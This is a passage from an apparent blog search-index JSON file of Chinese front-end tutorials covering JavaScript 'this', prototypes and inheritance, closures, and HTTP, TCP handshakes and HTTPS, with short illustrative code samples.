之后，代码就很好理解，返回一个函数，该函数把传给bind的第一个参数当做执行上下文，由于args已经是一个数组，排除第一项，将之后的部分作为第二部分参数传给apply，前面讲过apply的用法。 标注： 参考资料1：https://www.cnblogs.com/Shd-Study/archive/2017/03/16/6560808.html 参考资料2：http://web.jobbole.com/83642/ 参考资料3：http://blog.csdn.net/u014267183/article/details/52610600","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"this关键字","slug":"JS-bs-this","date":"2018-03-09T07:49:33.000Z","updated":"2019-01-25T10:12:17.464Z","comments":true,"path":"2018/03/09/JS-bs-this/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/09/JS-bs-this/","excerpt":"","text":"一、this this是JavaScript中的一个关键字，代表函数运行时，自动产生的一个内部对象。 函数使用场景的不同，this值也会不同，但它永远指向调用函数的那个对象。 二、this指向 虽然说有人说 谁调用这个函数或方法,this关键字就指向谁 ，但下面我们还是要来深究一下this的指向。 先上一张图：下图我们称之为”JavaScript this决策树”（非严格模式下），用它来帮助我们学习this指向。 接下来，我们分例子来说明： 例子1：普通函数调用下的this 123456789101112131415function person()&#123; this.name=&quot;xl&quot;; console.log(this); console.log(this.name);&#125;person(); //输出 window xl 或var name=&quot;xl&quot;;function person()&#123; console.log(this); console.log(this.name);&#125;person(); //输出 window xl person()函数在 “JavaScript this决策树”中进行判定的过程是这样的： 1）person()函数调用是用new进行调用的么？明显不是，进入“否”分支，即函数是否用dot(.)进行调用？； 2）person()函数不是用dot(.)进行调用的，即进入“否”分支，即这里的this指向全局变量window，那么this.name实际上就是window.name; 例子2：作为方法来调用下的this 123456789101112var name=&quot;XL&quot;;var person=&#123; name:&quot;xl&quot;, showName:function()&#123; console.log(this.name); &#125;&#125; person.showName(); //输出 xl var showNameA=person.showName;showNameA(); //输出 XL person.showName()函数在 “JavaScript this决策树”中进行判定的过程是这样的： 1）person.showName()函数调用是用new进行调用的么？明显不是，进入“否”分支，即函数是否用dot(.)进行调用？； 2）person.showName()是用dot(.)进行调用的，即进入“是”分支，即这里的this指向person.showName中.之前的对象person，所以输出person.name; showNameA()中，将person.showName方法赋给showNameA变量，此时showNameA变量相当于window对象的一个属性，因此showNameA()执行的时候相当于window.showNameA(),即window对象调用showNameA这个方法，所以this关键字指向window。 例子3：作为构造函数来调用下的this 12345678910function Person(name)&#123; this.name=name;&#125; var personA=Person(&quot;xl&quot;); console.log(personA.name); // 输出 undefined personA是一个空对象undefinedconsole.log(window.name); // 输出 xl var personB=new Person(&quot;xl&quot;);console.log(personB.name); // 输出 xl Person(“xl”)函数在var personA=Person(“xl”)中的this在 “JavaScript this决策树”中进行判定的过程是这样的： 1）var personA=Person(“xl”)调用是用new进行调用的么？明显不是，进入“否”分支，即函数是否用dot(.)进行调用？； 2）Person(“xl”)函数不是用dot(.)进行调用的，即进入“否”分支，即这里的this指向全局变量window，那么this.name实际上就是window.name; Person(“xl”)函数在var personB=new Person(“xl”)中的this在 “JavaScript this决策树”中进行判定的过程是这样的： 1）var personB=new Person(“xl”)调用是用new进行调用的么？明显是，进入“是”分支，即this指向personB 2）那么this.name=xl，即personB.name=xl； 例子4：call或apply调用下的this 12345678910111213function Point(x, y)&#123; this.x = x; this.y = y; this.moveTo = function(x, y)&#123; this.x = x; this.y = y; &#125; &#125; var p1 = new Point(0, 0); var p2 = &#123;x: 0, y: 0&#125;; p1.moveTo.apply(p2, [10, 10]); //apply实际上为p2.moveTo(10,10)p2.x //10 p1.moveTo.apply(p2,[10,10])函数在 “JavaScript this决策树”中进行判定的过程是这样的： 我们知道，apply 和 call 这两个方法允许切换函数执行的上下文环境（context），即 this 绑定的对象。p1.moveTo.apply(p2,[10,10])实际上是p2.moveTo(10,10)。那么p2.moveTo(10,10)可解释为 1）p2.moveTo(10,10)函数调用是用new进行调用的么？明显不是，进入“否”分支，即函数是否用dot(.)进行调用？； 2）p2.moveTo(10,10)函数是用dot(.)进行调用的，即进入“是”分支，即这里的this指向p2.moveTo(10,10)中.之前的对象p2,所以p2.x=10; 例子5：箭头函数条用下的this es6里面this指向固定化，始终指向外部对象，因为箭头函数没有this,因此它自身不能进行new实例化,同时也不能使用call, apply, bind等方法来改变this的指向。 12345678function Timer() &#123; this.seconds = 0; setInterval( () =&gt; this.seconds ++, 1000);&#125; var timer = new Timer();setTimeout( () =&gt; console.log(timer.seconds), 3100); // 3 在构造函数内部的setInterval()内的回调函数，this始终指向实例化的对象，并获取实例化对象的seconds的属性,每1s这个属性的值都会增加1。否则最后在3s后执行setTimeOut()函数执行后输出的是0 标注： 参考资料1：http://www.jb51.net/article/74097.htm 参考资料2：https://www.cnblogs.com/lisha-better/p/5684844.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"原型与原型链","slug":"JS-bs-prototype","date":"2018-03-08T11:37:58.000Z","updated":"2019-01-25T10:11:33.828Z","comments":true,"path":"2018/03/08/JS-bs-prototype/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/08/JS-bs-prototype/","excerpt":"","text":"一、原型与原型链 首先，说原型与原型链之前，我们先了解一下对象： Javascript中，对象可以分为两类：普通对象（Object）和函数对象（Function），一般通过new Function产生的对象是函数对象，其他对象都是普通对象。 1234567891011121314function f1()&#123;&#125;;var f2 = function()&#123;&#125;;var f3 = new Function('x','console.log(x)');var o1 = &#123;&#125;;var o2 = new Object();var o3 = new f1();console.log( typeof f1,//function typeof f2,//function typeof f3,//function typeof o1,//object typeof o2,//object typeof o3 //object); 说完对象，接下来我们进入原型与原型链： 原型是一个对象，其他对象可以通过它实现属性继承。 js每当创建一个函数对象如f1时，该对象中都会内置一些属性包括prototype和__proto __, js每当创建一个普通对象如o1时，该对象中都会内置一些属性包括__proto__， prototype是显式原型，它记录着f1的一些属性和方法（指向函数的原型对象），是子类创建的核心，是连接子类原型链的桥梁。 __proto__是隐式原型，构成原型链，实现基于原型的继承。 隐式原型指向创建这个对象的函数(constructor)的显式原型。 prototype 对f1是不可见的，即，f1不会查找prototype中的属性和方法。 prototype的主要作用就是继承，通俗一点讲，prototype中定义的属性和方法都是留给自己的“后代”用的，因此，子类完全可以访问prototype中的属性和方法。 __proto__在普通对象和函数对象中都存在， 它的作用就是保存父类的prototype对象，JS在通过new 表达式创建一个对象的时候，通常会把父类的prototype赋值给新对象的__proto__属性，这样，就形成了一代代传承…由__proto__组成了原型链 举个例子： 1234function f()&#123;&#125;f.prototype.foo = \"abc\";var obj = new f();console.log(obj.foo); //abc 其中，obj中__proto__保存的是f的prototype，那么，f的prototype中的__proto__中呢？ f.prototype的__proto__中保存的是Object.prototype， Object.prototype对象中也有__proto__，值是null，表示obj对象原型链的终结。 obj对象拥有这样一个原型链后，当obj.foo执行时，obj会先查找自身是否有该属性，但不会查找自己的prototype（因为没有么？）,当找不到foo时，obj就沿着原型链依次去查找。 上面的例子中，我们在f的prototype上定义了foo属性，这时obj就会在原型链上找到这个属性并执行。 二、new操作 众所周知new是用来创建一个新的实例对象，那么，在new的过程中，到底经过了什么呢？ 举个例子来说明： 1var cat = new Animal(\"cat\"); JS引擎在执行这句代码时，做了很多工作，用伪代码模拟其工作流程如下： 1234var obj = &#123;&#125;;obj.__proto__ = Animal.prototype;var result = Animal.call(obj,\"cat\");return typeof result === 'obj'? result : obj; 什么意思呢？下面我们分步来看： 1）第一步，创建一个空对象obj; 2）第二步，把obj的proto 指向Animal的原型对象prototype，此时便建立了obj对象的原型链：obj-&gt;Animal.prototype-&gt;Object.prototype-&gt;null 3）第三步，将Animal中的this指向obj，并给其赋值，obj便产生了属性name并赋值为”cat”。 4）第四步，考察第3步返回的返回值，如果无返回值或者返回一个非对象值，则将obj返回作为新对象；否则会将返回值作为新对象返回。 三、继承 要实现继承，首先我们得有一个父类，代码如下： 12345678910function Animal (name) &#123; // 定义一个动物类 this.name = name || 'Animal'; // 属性 this.sleep = function()&#123; // 实例方法 console.log(this.name + '正在睡觉！'); &#125;&#125;Animal.prototype.eat = function(food) &#123; // 原型方法 console.log(this.name + '正在吃：' + food);&#125;; 1、原型链继承： 核心： 将父类的实例作为子类的原型 12345678910function Cat()&#123; &#125;Cat.prototype = new Animal();Cat.prototype.name = 'cat';var cat = new Cat();console.log(cat.name);console.log(cat.eat('fish'));console.log(cat.sleep());console.log(cat instanceof Animal); //trueconsole.log(cat instanceof Cat); //true 特点： 1、非常纯粹的继承关系，实例是子类的实例，也是父类的实例 2、父类新增原型方法/原型属性，子类都能访问到 3、简单，易于实现 缺点： 1、无法实现多继承 2、来自原型对象的引用属性是所有实例共享的（详细请看附录代码： 示例1） 3、创建子类实例时，无法向父类构造函数传参 推荐指数：★★（2、3两大致命缺陷） 2、构造继承 核心：使用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类（没用到原型） 1234567891011function Cat(name)&#123; Animal.call(this); this.name = name || 'Tom';&#125;// Test Codevar cat = new Cat();console.log(cat.name);console.log(cat.sleep());console.log(cat instanceof Animal); // falseconsole.log(cat instanceof Cat); // true 特点： 1、可以实现多继承（call多个父类对象） 2、解决了1中子类实例共享父类引用属性的问题 3、创建子类实例时，可以向父类传递参数 缺点： 1、实例并不是父类的实例，只是子类的实例 2、只能继承父类的实例属性和方法，不能继承原型属性/方法 3、无法实现函数复用，每个子类都有父类实例函数的副本，影响性能 推荐指数：★★（缺点3） 3、实例继承 核心：为父类实例添加新特性，作为子类实例返回 123456789101112function Cat(name)&#123; var instance = new Animal(); instance.name = name || 'Tom'; return instance;&#125;// Test Codevar cat = new Cat();console.log(cat.name);console.log(cat.sleep());console.log(cat instanceof Animal); // trueconsole.log(cat instanceof Cat); // false 特点： 1、不限制调用方式，不管是new 子类()还是子类(),返回的对象具有相同的效果 缺点： 1、实例是父类的实例，不是子类的实例 2、不支持多继承 推荐指数：★★ 4、拷贝继承 1234567891011121314function Cat(name)&#123; var animal = new Animal(); for(var p in animal)&#123; Cat.prototype[p] = animal[p]; &#125; Cat.prototype.name = name || 'Tom';&#125;// Test Codevar cat = new Cat();console.log(cat.name);console.log(cat.sleep());console.log(cat instanceof Animal); // falseconsole.log(cat instanceof Cat); // true 特点： 1、支持多继承 缺点： 1、效率较低，内存占用高（因为要拷贝父类的属性） 2、无法获取父类不可枚举的方法（不可枚举方法，不能使用for in 访问到） 推荐指数：★（缺点1） 5、组合继承 核心：通过调用父类构造，继承父类的属性并保留传参的优点，然后通过将父类实例作为子类原型，实现函数复用 1234567891011121314function Cat(name)&#123; Animal.call(this); this.name = name || 'Tom';&#125;Cat.prototype = new Animal();Cat.prototype.constructor = Cat;// Test Codevar cat = new Cat();console.log(cat.name);console.log(cat.sleep());console.log(cat instanceof Animal); // trueconsole.log(cat instanceof Cat); // true 特点： 1、弥补了方式2的缺陷，可以继承实例属性/方法，也可以继承原型属性/方法 2、既是子类的实例，也是父类的实例 3、不存在引用属性共享问题 4、可传参 5、函数可复用 缺点： 1、调用了两次父类构造函数，生成了两份实例（子类实例将子类原型上的那份屏蔽了） 推荐指数：★★★★（仅仅多消耗了一点内存） 6、寄生组合继承 核心：通过寄生方式，砍掉父类的实例属性，这样，在调用两次父类的构造的时候，就不会初始化两次实例方法/属性，避免的组合继承的缺点 1234567891011121314151617181920function Cat(name)&#123; Animal.call(this); this.name = name || 'Tom';&#125;(function()&#123; // 创建一个没有实例方法的类 var Super = function()&#123;&#125;; Super.prototype = Animal.prototype; //将实例作为子类的原型 Cat.prototype = new Super();&#125;)();Cat.prototype.constructor = Cat;// Test Codevar cat = new Cat();console.log(cat.name);console.log(cat.sleep());console.log(cat instanceof Animal); // trueconsole.log(cat instanceof Cat); //true 特点： 1、堪称完美 缺点： 1、实现较为复杂 推荐指数：★★★★（实现复杂，扣掉一颗星） 123456789101112131415161718192021222324252627282930313233343536373839404142附录示例1：function Animal (name) &#123; // 属性 this.name = name || 'Animal'; // 实例方法 this.sleep = function()&#123; console.log(this.name + '正在睡觉！'); &#125; //实例引用属性 this.features = [];&#125;function Cat(name)&#123;&#125;Cat.prototype = new Animal();var tom = new Cat('Tom');var kissy = new Cat('Kissy');console.log(tom.name); // \"Animal\"console.log(kissy.name); // \"Animal\"console.log(tom.features); // []console.log(kissy.features); // []tom.name = 'Tom-New Name';tom.features.push('eat');//针对父类实例值类型成员的更改，不影响console.log(tom.name); // \"Tom-New Name\"console.log(kissy.name); // \"Animal\"//针对父类实例引用类型成员的更改，会通过影响其他子类实例console.log(tom.features); // ['eat']console.log(kissy.features); // ['eat']原因分析：关键点：属性查找过程执行tom.features.push，首先找tom对象的实例属性（找不到），那么去原型对象中找，也就是Animal的实例。发现有，那么就直接在这个对象的features属性中插入值。在console.log(kissy.features); 的时候。同上，kissy实例上没有，那么去原型上找。刚好原型上有，就直接返回，但是注意，这个原型对象中features属性值已经变化了。 标注： 本文继承部分来自https://www.cnblogs.com/humin/p/4556820.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"闭包","slug":"JS-bs-closure","date":"2018-03-08T08:20:15.000Z","updated":"2019-01-25T10:10:20.806Z","comments":true,"path":"2018/03/08/JS-bs-closure/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/08/JS-bs-closure/","excerpt":"","text":"一、什么是闭包 闭包是函数和声明该函数的词法环境的组合，简单的说就是内部函数对外部函数作用域的引用。 二、JS里面的闭包 12345678910function sayHello(name) &#123; let str = `Hello,$&#123;name&#125;`; function say() &#123; console.log(str); &#125; return say;&#125;let myHello = sayHello('abby');myHello(); // Hello,abby 上面这段代码，其实就形成了一个闭包，其中在 sayHello 这个函数里面定义的函数 say 和其声明它的词法环境就形成了一个闭包，因为它引用了sayHello 里面定义的一个变量 str，并且将 say 这个函数 return 了出去，这样在 sayHello 这个函数的外面也能访问它里面定义的变量 str，就好像 say 这个函数和这个变量绑定了一样。 注意点1：闭包并不是一定需要 return 某个函数 虽然常见的闭包都是 return 出来一个函数，但是闭包并不一定非要 return，return 出一个函数只是为了能在作用域范围之外访问一个变量，我们用另一种方式也能做到，比如： 123456789let say;function sayHello(name) &#123; let str = `Hello,$&#123;name&#125;`; say = function() &#123; console.log(str); &#125;&#125;let myHello = sayHello('abby');say(); // Hello,abby 注意点2：同一个调用函数生成同一个闭包环境，在里面声明的所有函数同时具有这个环境里面自由变量的引用 如下面用setUp这个函数生成了一个闭包环境，在这个环境里面的三个函数共享了这个环境里面的 number 变量的引用，因此都可以对 number 进行操作。 123456789101112131415161718let get, up, downfunction setUp() &#123; let number = 20 get = function() &#123; console.log(number); &#125; up = function() &#123; number += 3 &#125; down = function() &#123; number -=2; &#125;&#125;setUp();get(); // 20up();down();get(); // 21 注意点3：每一个调用函数都会创建不同的闭包环境 如下面的myClosure 和 yourClosure 赋值语句，也就是 newClosure 这个函数被调用了两次，因此创建了两个不同的闭包环境，里面的变量是互不影响的。 123456789101112function newClosure() &#123; let array = [1, 2]; return function(num) &#123; array.push(num); console.log(`array:$&#123;array&#125;`); &#125;&#125;let myClosure = newClosure();let yourClosure = newClosure();myClosure(3); // array:1,2,3yourClosure(4); // array:1,2,4myClosure(5); // array:1,2,3,5 注意点4： 在循环里面创建闭包 在 let 被引入之前，一个常见的错误就是在循环中创建闭包，例如： 12345678function newClosure() &#123; for(var i = 0; i &lt; 5; i++) &#123; setTimeout(function() &#123; console.log(i); &#125;) &#125;&#125;newClosure(); // 5个5 打印的结果是5个5而不是01234，因为 setTimeout 这个函数里面没有i变量，所以函数会向父级函数中查找，当找到i的时候for循环已经完毕，所以最终返回的是5个5（这里请看Javascript事件循环机制），若用ES6的let则不会，因为let的作用域为语句所在的代码块。 那么，如何让其打印出01234呢？ 一种是 创建一个新的闭包对象，这样每个闭包对象里面的变量就互不影响。如： 123456789101112function log(i) &#123; return function() &#123; console.log(i); &#125;&#125;function newClosure() &#123; for(var i = 0; i &lt; 5; i++) &#123; setTimeout(log(i)); &#125;&#125;newClosure(); // 0 1 2 3 4 另一种做法就是使用自执行函数，内部的匿名函数会立即执行，并把 i 作为它的参数，此时函数内 e 变量就拥有了 i 的一个拷贝。当传递给 setTimeout 的匿名函数执行时，它就拥有了对 e 的引用，而这个值是不会被循环改变的。 12345678910function newClosure() &#123; for(var i = 0; i &lt; 5; i++) &#123; (function(e) &#123; setTimeout(function() &#123; console.log(e); &#125;) &#125;)(i) &#125;&#125;newClosure(); // 0 1 2 3 4 第三种当然是使用ES6咯 三、闭包应用的两种情况 1、函数作为返回值 12345678910function fn()&#123; var max = 10; return function bar(x)&#123; if(x &gt; max)&#123; console.log(x); &#125; &#125;&#125;var f1 = fn();f1(15); //15 2、函数作为参数被传递（当值传递） 12345678910var max = 10;fn = function(x)&#123; if(x &gt; max)&#123; console.log(x); &#125;&#125;(function(f)&#123; var max = 100; f(15);&#125;)(fn); //15 执行f(15)时，max变量的取值是10，而不是100。 四、闭包的优缺点 优点： 1）闭包不会污染到全局变量，因为变量都被锁在内部作用域里了。 2）闭包保证了隐藏性和私有性，执行过程中所有的变量都是在闭包内部的。 缺点： 1）闭包会使函数变量一直驻在内存中，内存消耗变大，在IE中还有可能导致内存泄露，所以一定不能滥用闭包。解决方法是，在退出某些函数之前，尝试把不用的内部数据变量都删除。 标注： 参考资料1：luckyabby的个人博客http://luckyabby.com/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"http协议","slug":"network-bs-http","date":"2018-03-08T04:59:53.000Z","updated":"2019-01-25T10:15:31.668Z","comments":true,"path":"2018/03/08/network-bs-http/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/08/network-bs-http/","excerpt":"","text":"一、HTTP简介 HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。基于TCP/IP。 二、HTTP特点 1）工作方式：工作于客户端-服务端架构上。浏览器作为HTTP客户端通过URL向HTTP服务端发送请求，服务器向客户端发送响应。 2）简单快速：客户向服务器请求服务时，只需传送请求方法和路径。 3）无连接：即限制每次连接只处理一个请求。服务器处理完客户的请求并收到客户的应答后，即断开连接。 4）无状态：即不具备保存之前发送过的请求或响应的功能。 三、HTTP之URL HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。统一资源定位符（Uniform Resource Locator,URL）是一种特殊类型的URI，用来标识某一处资源的地址。 URL的组成看下图： 四、HTTP之请求消息Request 请求消息包括以下格式：请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。 请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本。 请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息。 空行，请求头部后面的空行是必须的。 请求数据也叫主体，可以添加任意的其他数据。 五、HTTP之响应消息Response 响应信息包括以下组成：状态行、消息报头、空行和响应正文。 状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。 消息报头，用来说明客户端要使用的一些附加信息。 空行，消息报头后面的空行是必须的。 响应正文，服务器返回给客户端的文本信息。 六、HTTP之状态码 状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别: 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求 常见状态码： 200 OK //请求已成功，请求所希望的响应头或数据体将随此响应返回。 302 Found //重定向，新的URL会在response 中的Location中返回，浏览器将会自动使用新的URL发出新的Request 304 Not Modified //代表上次的文档已经被缓存了， 还可以继续使用 400 Bad Request //客户端请求有语法错误，不能被服务器所理解 401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden //服务器收到请求，但是拒绝提供服务 404 Not Found //请求资源不存在，eg：输入了错误的URL 500 Internal Server Error //服务器发生不可预期的错误 503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 更多状态码http://www.runoob.com/http/http-status-codes.html 七、HTTP请求方法 HTTP1.0定义了三种请求方法：GET, POST 和 HEAD 方法。 HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。 123456789GET 请求指定的页面信息，并返回实体主体。HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头。POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。 数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。PUT 从客户端向服务器传送的数据取代指定的文档的内容。DELETE 请求服务器删除指定的页面。CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。OPTIONS 允许客户端查看服务器的性能。TRACE 回显服务器收到的请求，主要用于测试或诊断。 八、GET和POST 说到请求，肯定要比较一下GET和POST的区别 1）GET提交的数据放在URL后，以?分割URL和数据，参数之间以&amp;相连，POST是把提交的数据放在HTTP包的Body中。 2）GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据理论上没有限制。 3）POST的安全性要比GET的安全性高，因为GET提交的数据会在地址栏中显示出来，POST不会。 4）GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。 你以为到这里就结束了么？呵呵想多了，其实，GET跟PIST，在本质上是没有区别的，让我们扒开GET和POST的外衣看看吧 首先，GET和POST是什么? HTTP协议中的两种发送请求的方法。HTTP是什么? 基于TCP/IP的关于数据如何在万维网中如何通信的协议。HTTP的底层是TCP/IP，所以GET和POST的底层也是TCP/IP。也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。 那么，一开始说的那些区别又是怎么回事? 针对第一点： 举个例子，我们把TCP比作汽车，用TCP来运输数据，如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上。为了避免这种情况发生，交通规则HTTP诞生。HTTP给汽车运输设定了好几个服务类别，有GET, POST, PUT, DELETE等。HTTP规定，当执行GET请求的时候，要给汽车贴上GET的标签(设置method为GET)，而且要求把传送的数据放在车顶上(url中)以方便记录。如果是POST请求，就要在车上贴上POST的标签，并把货物放在车厢里。当然，你也可以在GET的时候往车厢内偷偷藏点货物，但是这是很不光彩;也可以在POST的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP只是个行为准则，而TCP才是GET和POST怎么实现的基本。 针对第二点： 上例还有另一个重要的角色：运输公司。不同的浏览器(发起http请求)和服务器(接受http请求)就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物(url中无限加参数)，但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。业界不成文的规定是，(大多数)浏览器通常都会限制url长度在2K个字节，而(大多数)服务器最多处理64K大小的url，超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。 针对第三点： 关于安全性问题，其实啊，GET跟POST都是不安全的，为什么？因为他们都是基于http的，而hHTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。所以说POST比GET安全，那只是表面的而已。（针对这个问题，https出现，下文讲） 那么，GET跟POST真的就一点区别都没有了么？不是不是，GET和POST有一个重大区别，就是： GET产生一个TCP数据包，POST产生两个TCP数据包。 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200(返回数据); 对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok(返回数据)。 也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。 因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑!为什么? 1、GET与POST都有自己的语义，不能随便混用。 2、据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。 3、并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。 九、HTTP工作原理 HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，包含请求方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，包括协议版本、成功或者错误代码、服务器信息、响应头部和响应数据。 步骤： 1）客户端与Web服务器建立TCP连接 2）客户端发送http请求 3）服务器接受请求并返回HTTP响应 4）释放连接TCP连接 5）客户端浏览器解析HTML内容 说到这里就得说一下TCP三次握手（连接）与四次挥手（断开）了： TCP连接是通过三次握手来连接的。 1）第一次握手 客户端向服务器发起连接请求，同时客户端发送同步序列标号SYN到服务器（设SYN为m），等待服务器确认，这时客户端的状态为SYN_SENT。 2）第二次握手 服务器收到客户端发送的SYN后，向客户端发送确认包ACK（ACK为m+1），意思是说“我收到了你发送的SYN了”。同时，服务器也会向客户端发送一个SYN包（设为n）。这时服务器的状态为SYN_RECV。 3）第三次握手 客户端收到服务器发送的SYN和ACK包后，向服务器发送确认包ACK（n+1），“我也收到你发送的SYN了，我这就给你发个确认过去，然后我们即能合体了”，发送完毕后，客户端和服务器的状态为ESTABLISH，即TCP连接成功。 三次握手中，客户端和服务器端都发送两个包SYN和ACK，只不过服务器端的两个包是一次性发过来的，客户端的两个包是分两次发送的。 TCP断开是通过四次挥手来断开的。 1）第一次挥手 A端向B端请求断开连接时会向B端发送一个带有FIN标记的报文段，这里的FIN是FINish的意思。 2）第二次挥手 B端收到A发送的FIN后，B段现在可能现在还有数据没有传完，所以B端并不会马上向A端发送FIN，而是先发送一个确认序号ACK，意思是说“你发的断开连接请求我收到了，但是我现在还有数据没有发完，请稍等一下呗”。 3）第三次挥手 当B端的事情忙完了，那么此时B端就可以断开连接了，此时B端向A端发送FIN序号，意思是这次可以断开连接了。 4）第四次挥手 A端收到B端发送的FIN后，会向B端发送确认ACK，然后经过两个MSL（MSL见下面）时长后断开连接。 说这里会有以下疑问： 1）TCP连接为什么要三次握手，两次握手可以么？ 假设一种情况，客户端发出的第一个连接请求时，有一报文段在某个网络结点长时间滞留了，以致延误到连接释放以后的某个时间才到达server。这是一个早已失效的报文段了，但server收到此失效的连接请求报文段后，就误认为是客户端再次发出的一个新的连接请求，于是就向客户端发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在客户端并没有发出建立连接的请求，因此不会理睬服务端的确认，也不会向服务端发送ACK包。这样就会白白浪费资源。而经过三次握手，客户端和服务器有应有答，这样可以确保TCP正确连接。 2）为什么TCP连接是三次，挥手确是四次？ 在连接中，服务器端的SYN和ACK向客户端发送是一次性发送的。而在断开中，B端向A端发送的ACK和FIN是是分两次发送的，因为在B端接收到A端的FIN后，B端可能还有数据要传输，所以先发送ACK，等B端处理完自己的事情后就可以发送FIN断开连接了。 3）为什么在第四次挥手后会有2个MSL的延时？ MSL是Maximum Segment Lifetime，最大报文段生存时间，2个MSL是报文段发送和接收的最长时间。 假定网络不可靠，那么第四次发送的ACK可能丢失，即B端无法收到这个ACK，如果B端收不到这个确认ACK，B端会定时向A端重复发送FIN，直到B端收到A的确认ACK。所以这个2MSL就是用来处理这个可能丢失的ACK的。 十、HTTPS HTTPS简介： 上文说到，HTTP协议被用于在Web浏览器和网站服务器之间传递信息，以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。 为了解决HTTP协议的这一缺陷，安全套接字层超文本传输协议HTTPS出现，为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL协议（安全协议，原理看下面），也即HTTPS的安全基础是SSL。 HTTPS其实是有两部分组成：HTTP + SSL / TLS，也就是在HTTP上又加了一层处理加密信息的模块。服务端和客户端的信息传输都会通过SSL进行加密，所以传输的数据都是加密后的数据。 HTTPS如何进行加密，解密，验证的？： 1）客户端发起HTTPS请求(1)： 就是用户在浏览器里输入一个https网址，然后连接到server的443端口。 2）服务端的配置： 采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织（CA）申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面。这套证书其实就是一对公钥和私钥。如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。 3）传送证书(2)： 这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。 4）客户端解析证书： 这部分工作是由客户端的SSL/TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随机值。然后用证书对该随机值进行加密。就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。 5）传送加密信息(3)： 